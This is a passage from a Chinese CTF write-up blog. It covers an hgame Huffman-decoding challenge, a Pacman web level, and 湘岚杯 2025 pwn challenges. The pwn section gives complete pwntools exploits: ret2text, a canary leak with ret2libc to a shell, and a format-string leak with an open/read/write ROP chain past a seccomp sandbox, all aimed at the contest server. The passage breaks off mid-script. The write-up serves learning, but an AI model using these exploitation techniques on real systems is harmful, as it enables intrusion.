class="hljs-number">78</span>&#125;&#125;,<br>                        <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">83</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">68</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">69</span>&#125;&#125;&#125;<br>                    &#125;<br>                &#125;,<br>                <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">44</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">33</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">38</span>&#125;&#125;&#125;,<br>                    <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">45</span>&#125;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">100</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">98</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">99</span>&#125;&#125;&#125;,<br>                <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">49</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">51</span>&#125;&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">97</span>&#125;&#125;<br>            &#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">117</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">118</span>&#125;&#125;,<br>                <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">112</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">113</span>&#125;&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">114</span>&#125;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">108</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">109</span>&#125;&#125;,<br>                <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">110</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">111</span>&#125;&#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 构建 Huffman 树</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_huffman_tree</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;s&#x27;</span>: data[<span class="hljs-string">&#x27;s&#x27;</span>], <span class="hljs-string">&#x27;w&#x27;</span>: data.get(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">0</span>)&#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&#x27;a&#x27;</span>: build_huffman_tree(data[<span class="hljs-string">&#x27;a&#x27;</span>]),<br>            <span class="hljs-string">&#x27;b&#x27;</span>: build_huffman_tree(data[<span class="hljs-string">&#x27;b&#x27;</span>]),<br>            <span class="hljs-string">&#x27;w&#x27;</span>: data.get(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">0</span>)<br>        &#125;<br><br>huffman_tree = build_huffman_tree(data)<br><br><span class="hljs-comment"># 生成解码表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_decode_table</span>(<span class="hljs-params">tree, path=<span class="hljs-string">&quot;&quot;</span>, decode_table=&#123;&#125;</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">in</span> tree:<br>        decode_table[tree[<span class="hljs-string">&#x27;s&#x27;</span>]] = path<br>    <span class="hljs-keyword">else</span>:<br>        generate_decode_table(tree[<span class="hljs-string">&#x27;a&#x27;</span>], path + <span class="hljs-string">&quot;0&quot;</span>, decode_table)<br>        generate_decode_table(tree[<span class="hljs-string">&#x27;b&#x27;</span>], path + <span class="hljs-string">&quot;1&quot;</span>, decode_table)<br>    <span class="hljs-keyword">return</span> decode_table<br><br>decode_table = generate_decode_table(huffman_tree)<br><br><span class="hljs-comment"># 打印解码表</span><br><span class="hljs-keyword">for</span> char, code <span class="hljs-keyword">in</span> decode_table.items():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Character: <span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(char)&#125;</span>, Code: <span class="hljs-subst">&#123;code&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 解码二进制字符串</span><br>binary_string = <span class="hljs-string">&quot;00010001110111111010010000011100010111000100111000110000100010111001110010011011010101111011101100110100011101101001110111110111011011001110110011110011110110111011101101011001111011001111000111001101111000011001100001011011101100011100101001110010111001111000011000101001010000000100101000100010011111110110010111010101000111101000110110001110101011010011111111001111111011010101100001101110101101111110100100111100100010110101111111111100110001010101101110010011111000110110101101111010000011110100000110110101011000111111000110101001011100000110111100000010010100010001011100011100111001011101011111000101010110101111000001100111100011100101110101111100010110101110000010100000010110001111011100011101111110101010010011101011100100011110010010110111101110111010111110110001111010101110010001011100100101110001011010100001110101000101111010100110001110101011101100011011011000011010000001011000111011111111100010101011100000&quot;</span><br><br><span class="hljs-comment"># 反转解码表，用于解码</span><br>reverse_decode_table = &#123;v: k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> decode_table.items()&#125;<br><br><span class="hljs-comment"># 解码过程</span><br>current_code = <span class="hljs-string">&quot;&quot;</span><br>decoded_text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> binary_string:<br>    current_code += bit<br>    <span class="hljs-keyword">if</span> current_code <span class="hljs-keyword">in</span> reverse_decode_table:<br>        decoded_text += <span class="hljs-built_in">chr</span>(reverse_decode_table[current_code])<br>        current_code = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoded Text:&quot;</span>, decoded_text)<br></code></pre></td></tr></table></figure><p>hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>查看源代码，在 index.js 中发现有分数变量</p><img src="/post/8f4f1881/1738929676220-e6dc6c30-ef04-4fb8-8967-c7758e79e114.png" class="" title="img"><p>直接在控制台中将分数修改为 10000，到到 base64 密码</p><img src="/post/8f4f1881/1738929761443-18adc766-e1f9-42e8-b0cd-2c4fb912e62b.png" class="" title="img"><p>然后进行 base64 解码和 2 栏栅栏解码</p><img src="/post/8f4f1881/1738930168370-4843601d-e76e-411e-aa30-52d3085a997e.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>湘岚杯 2025</title>
    <link href="/post/2004.html"/>
    <url>/post/2004.html</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="ret2text签到"><a href="#ret2text签到" class="headerlink" title="ret2text签到"></a>ret2text签到</h2><p>ret2text</p><img src="/post/2004/1737108997002-a33ba1d7-fb58-4edc-810c-677cba7f434f.png" class="" title="img"><img src="/post/2004/1737109014977-2d2df38e-bb46-4463-81f8-8ead0324ed13.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">41658</span>)<br><br>shell = <span class="hljs-number">0x401157</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xA</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(shell)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><p>开了 Canary 和 NX 保护</p><img src="/post/2004/1737109393365-f5eb554f-8353-439a-991c-bcfe05f8829e.png" class="" title="img"><p>bug 函数有两次输入，第一次输入之后 printf 会打印输入的内容</p><img src="/post/2004/1737109363183-e193bf1a-7f00-4a3a-884a-c5254af286ed.png" class="" title="img"><p>由于程序开了 canary 保护，所以需要泄露出 canary。我们注意到 canary 在 rbp-8 的位置，那么我们可以先输入 0x30-0x8 字节的数据，然后再输入一个字节，在 printf 打印数据时，canary 也会被泄露出来，最后在第二次输入时打 ret2libc 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">26764</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc6_2.27-3ubuntu1.6_amd64.so&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x400764</span><br>pop_rdi = <span class="hljs-number">0x400843</span><br>ret = <span class="hljs-number">0x40059e</span><br><br>p.recvuntil(<span class="hljs-string">&quot;I think it&#x27;s easy to get the flag!&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>p.recvuntil(<span class="hljs-string">&quot;Maybe UR closer to the key&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;keep trying\n&quot;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;I think it&#x27;s easy to get the flag!&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Maybe UR closer to the key&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="你知道sandbox吗？"><a href="#你知道sandbox吗？" class="headerlink" title="你知道sandbox吗？"></a>你知道sandbox吗？</h2><p>这道题也是离谱，中途换了附件，然后 libc 也没给对。</p><img src="/post/2004/1737110334744-235090bd-5163-4f6f-b61f-2fb936e0b843.png" class="" title="img"><p>开了 Canary 和 NX 保护</p><img src="/post/2004/1737110402466-95b777c5-898e-4fc7-9835-18e36b8cfcb4.png" class="" title="img"><p>main 函数调用了 sandbox 函数和 func 函数</p><img src="/post/2004/1737110613744-2ce28711-9d52-45b3-a7cb-22e5c73b33cd.png" class="" title="img"><p>func 函数有两次输入，第一次输入的大小是 0x20，没有栈溢出，但接下来的 printf 存在格式化字符串漏洞；第二次输入的大小是 0x150，存在栈溢出</p><img src="/post/2004/1737110246782-167c1530-1bac-40ea-8ea9-e92072b31252.png" class="" title="img"><p>查看沙箱发现禁用了 execve</p><img src="/post/2004/1737110586791-9ee601ad-3ef5-4af3-a228-a4b4de9d2bfb.png" class="" title="img"><p>我们可以先利用格式化字符串来泄露出 canary 和 libc，gdb 调试，发现 canary 和 libc 分别在 13 和 19 的位置</p><img src="/post/2004/1737111786328-46bb0046-81ec-4762-a63f-7b418477101a.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p-%19$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>p.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br></code></pre></td></tr></table></figure><p>由于开了沙箱，我们选择使用 orw 来将 flag 读出来</p><p>我们先构造 read 的 rop 链，用于后续将文件 .&#x2F;flag 读到 bss 段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#read(0, bss, 0x40)bss-&gt;&#x27;./flag&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br></code></pre></td></tr></table></figure><p>接着使用 open 打开 bss 段上的文件.&#x2F;flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(bss, 0, 0)bss-&gt;&#x27;./flag&#x27;</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-built_in">open</span>)<br></code></pre></td></tr></table></figure><p>然后使用 read 读取文件.&#x2F;flag 的内容到 bss 段，由于.&#x2F;flag 是第一个打开的文件，所以文件描述符是 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br></code></pre></td></tr></table></figure><p>最后需要将 flag 打印出来，这里我使用了 puts 来打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn1&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">48321</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401402</span><br>pop_rdi = <span class="hljs-number">0x4014c3</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p-%19$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>p.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br><span class="hljs-comment">#read(0, bss, 0x40)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-built_in">open</span>)<br><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br>p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(<span class="hljs-string">b&#x27;./flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>值得一提的是，由于当时 libc 没给对，给我做急眼了，然后突然意识其实这道题可以泄露出 puts 函数的真实地址，远程 puts 函数的真实地址是 e50 结尾，这正好是我虚拟机 Ubuntu22.04 的 libc。</p><p>我们先利用格式化字符串泄露出 canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br></code></pre></td></tr></table></figure><p>第二次输入我们泄露出 puts 函数的真实地址，再返回 main 函数，然后就是利用 puts 函数计算 libc 基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 